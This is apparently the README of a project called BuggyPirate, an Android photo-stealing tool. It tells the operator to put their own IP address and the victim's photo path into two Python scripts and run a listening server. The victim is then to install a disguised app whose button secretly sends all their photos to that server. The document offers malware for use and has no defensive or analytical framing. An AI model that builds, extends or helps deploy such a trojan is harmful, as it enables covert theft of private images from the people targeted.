☠️This BuggyPirate is still in development 
This is a photo stealer only
The Buggyapp will be converted to an apk
You need to specify the photo path of your victim in the retry.py file
Change the server address with your ip address in RS42.py folder and retry.py and they both have to be the same

To run this,use a terminal and enter python RS42.py---> This will create a server and will listen to the victim
The victim should install the Buggyapp and run on their device,once they click the button,the retry.py script will be executed which will send
all the photos of the victim to the server☠️
